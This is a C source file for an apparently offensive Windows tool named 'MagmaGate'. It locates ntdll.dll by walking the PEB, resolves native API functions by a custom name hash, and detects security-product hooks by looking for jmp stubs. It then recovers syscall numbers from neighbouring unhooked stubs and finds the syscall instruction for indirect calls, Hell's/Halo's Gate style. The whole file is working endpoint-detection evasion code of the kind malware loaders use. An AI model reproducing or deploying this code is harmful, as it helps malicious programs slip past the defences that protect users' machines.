#include "box.h"

#define DOWN 32
#define UP -32

PVOID WalkPeb()
{

	PPEB pPeb = __readgsqword(0x60);
	PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)pPeb->Ldr;

	INFO("PEB Address: [0x%p]", pPeb);
	INFO("Ldr Address: [0x%p]", pLdr);

	PLIST_ENTRY head = &pLdr->InMemoryOrderModuleList;
	PLIST_ENTRY entry = head->Flink;

	for (PLIST_ENTRY pList = entry; pList != head; pList = pList->Flink)
	{

		PLDR_DATA_TABLE_ENTRY Ntdll =
			CONTAINING_RECORD(
				pList,
				LDR_DATA_TABLE_ENTRY,
				InMemoryOrderLinks
			);

		if (_wcsicmp(Ntdll->BaseDllName.Buffer, L"ntdll.dll") == 0)
		{
			OKAY("Found Address for Ntdll | Base Address: [0x%p]", Ntdll->DllBase);
			return Ntdll->DllBase;
		}

	}

	return NULL;

}

BOOL GetEAT
(
	IN PVOID Ntdllbase,
	OUT PIMAGE_EXPORT_DIRECTORY* pImgDir
)
{

	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)Ntdllbase;
	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		PRINT_ERROR("Dos Header");
		return FALSE;
	}

	PIMAGE_NT_HEADERS64 pImgNt = (PIMAGE_NT_HEADERS64)((PBYTE)Ntdllbase + pImgDos->e_lfanew);
	if (pImgNt->Signature != IMAGE_NT_SIGNATURE)
	{
		PRINT_ERROR("Nt Headers");
		return FALSE;
	}

	PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)Ntdllbase + pImgNt->OptionalHeader.DataDirectory[0].VirtualAddress);

	INFO("pImgExpDir [0x%p]", pImgExpDir);

	*pImgDir = pImgExpDir;

	return TRUE;

}

DWORD sdbmrol16
(
	IN PCHAR String
)
{

	UINT hash = 0;
	UINT StringLen = strlen(String);

	for (UINT i = 0; i < StringLen; i++)
	{
		hash = (hash << 16) | (hash >> (32 - 16));
		hash = (toupper(String[i])) + (hash << 6) + (hash << 16) - hash;
		hash = hash ^ i;
	}

	return hash;

}

PVOID GrabSSN
(
	IN PVOID FuncAddr,
	OUT DWORD64* SyscallNumber,
	OUT INT_PTR* SyscallInstr
)

{

	if (*((PBYTE)FuncAddr) == 0x4c
		&& *((PBYTE)FuncAddr + 1) == 0x8b
		&& *((PBYTE)FuncAddr + 2) == 0xd1
		&& *((PBYTE)FuncAddr + 3) == 0xb8
		&& *((PBYTE)FuncAddr + 6) == 0x00
		&& *((PBYTE)FuncAddr + 7) == 0x00)
	{
		BYTE high = *((PBYTE)FuncAddr + 5);
		BYTE low = *((PBYTE)FuncAddr + 4);

		DWORD64 SSN = (high << 8) | low;
		*SyscallNumber = SSN;
		for (DWORD i = 0; i < 32; i++)
		{
			if (*((PBYTE)FuncAddr + i) == 0x0F &&
				*((PBYTE)FuncAddr + i + 1) == 0x05)
			{
				*SyscallInstr = (INT_PTR)FuncAddr + i;
				return FuncAddr;
			}
		}
	}

	return NULL;

}

PVOID SSNUnhook
(
	IN PVOID FuncAddr,
	IN DWORD64* SyscallNumber,
	IN INT_PTR* SyscallInstr
)

{

	for (DWORD x = 0; x < 500; x++)
	{
		if (*((PBYTE)FuncAddr + x * DOWN) == 0x4c
			&& *((PBYTE)FuncAddr + 1 + x * DOWN) == 0x8b
			&& *((PBYTE)FuncAddr + 2 + x * DOWN) == 0xd1
			&& *((PBYTE)FuncAddr + 3 + x * DOWN) == 0xb8
			&& *((PBYTE)FuncAddr + 6 + x * DOWN) == 0x00
			&& *((PBYTE)FuncAddr + 7 + x * DOWN) == 0x00)
		{
			BYTE high = *((PBYTE)FuncAddr + 5 + x * DOWN);
			BYTE low = *((PBYTE)FuncAddr + 4 + x * DOWN);

			DWORD64 SSN = ((high << 8) | low) - x;
			*SyscallNumber = SSN;

			PBYTE stub = (PBYTE)FuncAddr + x * DOWN;

			for (DWORD i = 0; i < 32; i++)
			{
				if (*((PBYTE)stub + i) == 0x0F &&
					*((PBYTE)stub + i + 1) == 0x05)
				{
					*SyscallInstr = (INT_PTR)stub + i;
					return FuncAddr;
				}
			}
		}

		if (*((PBYTE)FuncAddr + x * UP) == 0x4c
			&& *((PBYTE)FuncAddr + 1 + x * UP) == 0x8b
			&& *((PBYTE)FuncAddr + 2 + x * UP) == 0xd1
			&& *((PBYTE)FuncAddr + 3 + x * UP) == 0xb8
			&& *((PBYTE)FuncAddr + 6 + x * UP) == 0x00
			&& *((PBYTE)FuncAddr + 7 + x * UP) == 0x00)
		{
			BYTE high = *((PBYTE)FuncAddr + 5 + x * UP);
			BYTE low = *((PBYTE)FuncAddr + 4 + x * UP);

			DWORD64 SSN = ((high << 8) | low) + x;
			*SyscallNumber = SSN;

			PBYTE stubup = (PBYTE)FuncAddr + x * UP;

			for (DWORD i = 0; i < 32; i++)
			{
				if (*((PBYTE)stubup + i) == 0x0F &&
					*((PBYTE)stubup + i + 1) == 0x05)
				{
					*SyscallInstr = (INT_PTR)stubup + i;
					return FuncAddr;
				}
			}
		}
	}

	return NULL;

}

BOOL relative_jmp(IN PVOID FuncAddr)
{

	for (DWORD i = 0; i < 32; i++)
	{
		if (*((PBYTE)FuncAddr + i) == 0xe9)
			return TRUE;
	}

	return FALSE;
}

BOOL absolute_jmp(IN PVOID FuncAddr)
{

	unsigned char jmp_stub[] = {
	0xFF, 0x25
	};

	if (memcmp(FuncAddr, jmp_stub, sizeof(jmp_stub)) != 0)
		return FALSE;

	INT32 Hookadr = *(INT32*)((PBYTE)FuncAddr + 2);
	PBYTE ptr = (PBYTE)FuncAddr + 6 + Hookadr;

	PVOID target = *(PVOID*)ptr;

	return TRUE;
}

BOOL MagmaGate
(
	IN PIMAGE_EXPORT_DIRECTORY pImgDir,
	IN PVOID Ntdllbase,
	IN DWORD ApiHash,
	OUT PSYSCALL_INFO pSysInfo
)

{

	PDWORD Address = (PDWORD)((LPBYTE)Ntdllbase + pImgDir->AddressOfFunctions);
	PDWORD Name = (PDWORD)((LPBYTE)Ntdllbase + pImgDir->AddressOfNames);
	PWORD Ordinal = (PWORD)((LPBYTE)Ntdllbase + pImgDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pImgDir->NumberOfNames; i++)
	{

		CHAR* FuncName = (CHAR*)Ntdllbase + Name[i];

		if (FuncName[0] != 'N' || FuncName[1] != 't')
			continue; // Skip Any Non-NTAPI Functions

		if (ApiHash != sdbmrol16(FuncName))
			continue;
		WORD ord = Ordinal[i];
		PVOID FuncAddr = (LPBYTE)Ntdllbase + Address[ord];

		BOOL Success = FALSE;
		DWORD64 SyscallNumber = NULL;
		INT_PTR SyscallInstr = NULL;

		if (relative_jmp(FuncAddr) || absolute_jmp(FuncAddr))
		{
			INFO("Jmp Detected! Unhooking SSN");
			Success = SSNUnhook(FuncAddr, &SyscallNumber, &SyscallInstr);
		}

		else
		{
			INFO("No Jmp Detected! Grabbing SSN + Syscall");
			Success = GrabSSN(FuncAddr, &SyscallNumber, &SyscallInstr);
		}

		if (!Success)
			return FALSE;

		pSysInfo->Nt_Function = FuncAddr;
		pSysInfo->SSN = SyscallNumber;
		pSysInfo->SyscallInstruction = (PVOID)SyscallInstr;

		return TRUE;

	}

	return FALSE;

}
